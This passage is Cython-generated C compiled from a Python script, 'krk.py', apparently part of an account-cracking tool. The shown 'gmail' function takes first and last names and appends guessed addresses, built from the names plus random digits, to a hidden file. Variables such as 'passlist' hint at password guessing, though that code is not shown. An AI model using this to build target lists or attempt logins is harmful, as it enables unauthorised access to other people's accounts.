  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__30, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 287, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":288
 *                 linex()
 *                 input(' Press enter to back ')
 *                 os.system('python ZEA.py')             # <<<<<<<<<<<<<<
 * def gmail():
 *                 os.system('rm -rf .re.txt')
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 288, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 288, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  __pyx_t_4 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_4 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_2, __pyx_kp_s_python_ZEA_py};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 288, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":259
 *                 input(' Press enter to back ')
 *                 os.system('python ZEA.py')
 * def bd():             # <<<<<<<<<<<<<<
 *                 user=[]
 *                 clear()
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_13);
  __Pyx_AddTraceback("krk.bd", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_code);
  __Pyx_XDECREF(__pyx_v_limit);
  __Pyx_XDECREF(__pyx_v_nmbr);
  __Pyx_XDECREF(__pyx_v_nmp);
  __Pyx_XDECREF(__pyx_v_Sabir);
  __Pyx_XDECREF(__pyx_v_tl);
  __Pyx_XDECREF(__pyx_v_psx);
  __Pyx_XDECREF(__pyx_v_ids);
  __Pyx_XDECREF(__pyx_v_passlist);
  __Pyx_XDECREF(__pyx_gb_3krk_2bd_2generator1);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "krk.py":289
 *                 input(' Press enter to back ')
 *                 os.system('python ZEA.py')
 * def gmail():             # <<<<<<<<<<<<<<
 *                 os.system('rm -rf .re.txt')
 *                 clear()
 */

/* Python wrapper */
static PyObject *__pyx_pw_3krk_11gmail(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_3krk_11gmail = {"gmail", (PyCFunction)__pyx_pw_3krk_11gmail, METH_NOARGS, 0};
static PyObject *__pyx_pw_3krk_11gmail(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("gmail (wrapper)", 0);
  __pyx_r = __pyx_pf_3krk_10gmail(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_3krk_5gmail_2generator2(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */

/* "krk.py":314
 *                         lchoice = random.choice(lists)
 *                         if '3' in lchoice:
 *                                 mail = ''.join(random.choice(string.digits) for _ in range(3))             # <<<<<<<<<<<<<<
 *                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 *                         else:
 */

static PyObject *__pyx_pf_3krk_5gmail_genexpr(CYTHON_UNUSED PyObject *__pyx_self) {
  struct __pyx_obj_3krk___pyx_scope_struct_2_genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_3krk___pyx_scope_struct_2_genexpr *)__pyx_tp_new_3krk___pyx_scope_struct_2_genexpr(__pyx_ptype_3krk___pyx_scope_struct_2_genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_3krk___pyx_scope_struct_2_genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 314, __pyx_L1_error)
  } else {
    __Pyx_GOTREF((PyObject *)__pyx_cur_scope);
  }
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_3krk_5gmail_2generator2, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_gmail_locals_genexpr, __pyx_n_s_krk); if (unlikely(!gen)) __PYX_ERR(0, 314, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("krk.gmail.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF((PyObject *)__pyx_cur_scope);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_3krk_5gmail_2generator2(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_3krk___pyx_scope_struct_2_genexpr *__pyx_cur_scope = ((struct __pyx_obj_3krk___pyx_scope_struct_2_genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  long __pyx_t_1;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    case 1: goto __pyx_L6_resume_from_yield;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 314, __pyx_L1_error)
  for (__pyx_t_1 = 0; __pyx_t_1 < 3; __pyx_t_1+=1) {
    __pyx_cur_scope->__pyx_v__ = __pyx_t_1;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 314, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 314, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_string); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 314, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_digits); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 314, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = NULL;
    __pyx_t_6 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
        __pyx_t_6 = 1;
      }
    }
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_t_5};
      __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_6, 1+__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 314, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    }
    __pyx_r = __pyx_t_2;
    __pyx_t_2 = 0;
    __pyx_cur_scope->__pyx_t_0 = __pyx_t_1;
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
    /* return from generator, yielding value */
    __pyx_generator->resume_label = 1;
    return __pyx_r;
    __pyx_L6_resume_from_yield:;
    __pyx_t_1 = __pyx_cur_scope->__pyx_t_0;
    if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 314, __pyx_L1_error)
  }
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  PyErr_SetNone(PyExc_StopIteration);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_Generator_Replace_StopIteration(0);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_3krk_5gmail_5generator3(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */

/* "krk.py":317
 *                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 *                         else:
 *                                 mail = ''.join(random.choice(string.digits) for _ in range(4))             # <<<<<<<<<<<<<<
 *                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 *                         fo = open('.re.txt', 'r').read().splitlines()
 */

static PyObject *__pyx_pf_3krk_5gmail_3genexpr(CYTHON_UNUSED PyObject *__pyx_self) {
  struct __pyx_obj_3krk___pyx_scope_struct_3_genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_3krk___pyx_scope_struct_3_genexpr *)__pyx_tp_new_3krk___pyx_scope_struct_3_genexpr(__pyx_ptype_3krk___pyx_scope_struct_3_genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_3krk___pyx_scope_struct_3_genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 317, __pyx_L1_error)
  } else {
    __Pyx_GOTREF((PyObject *)__pyx_cur_scope);
  }
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_3krk_5gmail_5generator3, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_gmail_locals_genexpr, __pyx_n_s_krk); if (unlikely(!gen)) __PYX_ERR(0, 317, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("krk.gmail.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF((PyObject *)__pyx_cur_scope);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_3krk_5gmail_5generator3(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_3krk___pyx_scope_struct_3_genexpr *__pyx_cur_scope = ((struct __pyx_obj_3krk___pyx_scope_struct_3_genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  long __pyx_t_1;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    case 1: goto __pyx_L6_resume_from_yield;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 317, __pyx_L1_error)
  for (__pyx_t_1 = 0; __pyx_t_1 < 4; __pyx_t_1+=1) {
    __pyx_cur_scope->__pyx_v__ = __pyx_t_1;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 317, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 317, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_string); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 317, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_digits); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 317, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = NULL;
    __pyx_t_6 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
        __pyx_t_6 = 1;
      }
    }
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_t_5};
      __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_6, 1+__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 317, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    }
    __pyx_r = __pyx_t_2;
    __pyx_t_2 = 0;
    __pyx_cur_scope->__pyx_t_0 = __pyx_t_1;
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
    /* return from generator, yielding value */
    __pyx_generator->resume_label = 1;
    return __pyx_r;
    __pyx_L6_resume_from_yield:;
    __pyx_t_1 = __pyx_cur_scope->__pyx_t_0;
    if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 317, __pyx_L1_error)
  }
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  PyErr_SetNone(PyExc_StopIteration);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_Generator_Replace_StopIteration(0);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "krk.py":289
 *                 input(' Press enter to back ')
 *                 os.system('python ZEA.py')
 * def gmail():             # <<<<<<<<<<<<<<
 *                 os.system('rm -rf .re.txt')
 *                 clear()
 */

static PyObject *__pyx_pf_3krk_10gmail(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_first = NULL;
  PyObject *__pyx_v_last = NULL;
  PyObject *__pyx_v_domain = NULL;
  PyObject *__pyx_v_limit = NULL;
  PyObject *__pyx_v_lists = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_xd = NULL;
  PyObject *__pyx_v_lchoice = NULL;
  PyObject *__pyx_v_mail = NULL;
  PyObject *__pyx_v_fo = NULL;
  PyObject *__pyx_v_Sabir = NULL;
  PyObject *__pyx_v_total = NULL;
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_ids = NULL;
  PyObject *__pyx_v_names = NULL;
  PyObject *__pyx_v_first_name = NULL;
  PyObject *__pyx_v_last_name = NULL;
  PyObject *__pyx_v_fs = NULL;
  PyObject *__pyx_v_ls = NULL;
  PyObject *__pyx_v_passlist = NULL;
  PyObject *__pyx_gb_3krk_5gmail_2generator2 = 0;
  PyObject *__pyx_gb_3krk_5gmail_5generator3 = 0;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  Py_ssize_t __pyx_t_8;
  PyObject *(*__pyx_t_9)(PyObject *);
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  PyObject *(*__pyx_t_16)(PyObject *);
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  PyObject *__pyx_t_19 = NULL;
  PyObject *__pyx_t_20 = NULL;
  PyObject *__pyx_t_21 = NULL;
  PyObject *__pyx_t_22 = NULL;
  int __pyx_t_23;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("gmail", 0);

  /* "krk.py":290
 *                 os.system('python ZEA.py')
 * def gmail():
 *                 os.system('rm -rf .re.txt')             # <<<<<<<<<<<<<<
 *                 clear()
 *                 print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 290, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 290, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  __pyx_t_4 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_4 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_2, __pyx_kp_s_rm_rf_re_txt};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 290, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":291
 * def gmail():
 *                 os.system('rm -rf .re.txt')
 *                 clear()             # <<<<<<<<<<<<<<
 *                 print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
 *                 linex()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_clear); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 291, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = NULL;
  __pyx_t_4 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_4 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[1] = {__pyx_t_2, };
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 291, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":292
 *                 os.system('rm -rf .re.txt')
 *                 clear()
 *                 print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')             # <<<<<<<<<<<<<<
 *                 linex()
 *                 first = input(' Put first name: ')
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__54, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 292, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":293
 *                 clear()
 *                 print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
 *                 linex()             # <<<<<<<<<<<<<<
 *                 first = input(' Put first name: ')
 *                 linex()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_linex); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 293, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = NULL;
  __pyx_t_4 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_4 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[1] = {__pyx_t_2, };
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 293, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":294
 *                 print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
 *                 linex()
 *                 first = input(' Put first name: ')             # <<<<<<<<<<<<<<
 *                 linex()
 *                 print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__55, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 294, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_first = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "krk.py":295
 *                 linex()
 *                 first = input(' Put first name: ')
 *                 linex()             # <<<<<<<<<<<<<<
 *                 print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
 *                 linex()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_linex); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 295, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = NULL;
  __pyx_t_4 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_4 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[1] = {__pyx_t_2, };
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 295, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":296
 *                 first = input(' Put first name: ')
 *                 linex()
 *                 print('\033[1;37m example: khan, ahmad, ali \033[1;97m')             # <<<<<<<<<<<<<<
 *                 linex()
 *                 last = input(' Put last name: ')
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__56, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 296, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":297
 *                 linex()
 *                 print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
 *                 linex()             # <<<<<<<<<<<<<<
 *                 last = input(' Put last name: ')
 *                 linex()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_linex); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 297, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = NULL;
  __pyx_t_4 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_4 = 1;
    }
  }
  {
